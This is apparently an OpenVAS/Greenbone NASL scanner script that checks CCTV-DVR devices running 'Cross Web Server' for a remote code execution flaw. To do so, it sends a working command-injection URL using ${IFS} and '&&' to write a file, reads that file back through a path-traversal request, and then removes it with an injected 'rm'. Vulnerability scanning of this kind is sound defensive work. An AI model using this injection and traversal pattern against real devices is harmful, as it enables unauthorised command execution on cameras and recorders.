if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807674" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2016-04-20 15:15:28 +0530 (Wed, 20 Apr 2016)" );
	script_name( "Multiple CCTV-DVR Vendors - Remote Code Execution Vulnerability" );
	script_tag( name: "summary", value: "The host is running a CCTV-DVR system,
  which is prone to remote code execution vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP POST request and check
  whether it is possible to write a file into the server." );
	script_tag( name: "insight", value: "The flaw is due to an improper validation
  in implementation of the HTTP server." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary script code in a user's browser session and
  allows any remote user to read configuration files from the application." );
	script_tag( name: "affected", value: "For Affecfted vendors,
  please" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/39596" );
	script_xref( name: "URL", value: "http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_mandatory_keys( "Cross_Web_Server/banner" );
	script_require_ports( "Services/www", 82 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
nmsPort = http_get_port( default: 82 );
banner = http_get_remote_headers( port: nmsPort );
if(!banner || ( !ContainsString( banner, "Server:Cross Web Server" ) )){
	exit( 0 );
}
url = "/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js";
req = http_get( item: url, port: nmsPort );
buf = http_keepalive_send_recv( port: nmsPort, data: req );
if(buf && ContainsString( buf, "Cross couldn't find this file" )){
	req = http_get( item: "/../../../../../../../mnt/mtd/test", port: nmsPort );
	buf1 = http_keepalive_send_recv( port: nmsPort, data: req, bodyonly: TRUE );
	if(ContainsString( buf1, "1" ) && strlen( buf1 ) == 2){
		report = http_report_vuln_url( port: nmsPort, url: url );
		security_message( port: nmsPort, data: report );
		req = http_get( item: "/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js", port: nmsPort );
		buf = http_keepalive_send_recv( port: nmsPort, data: req );
		exit( 0 );
	}
}

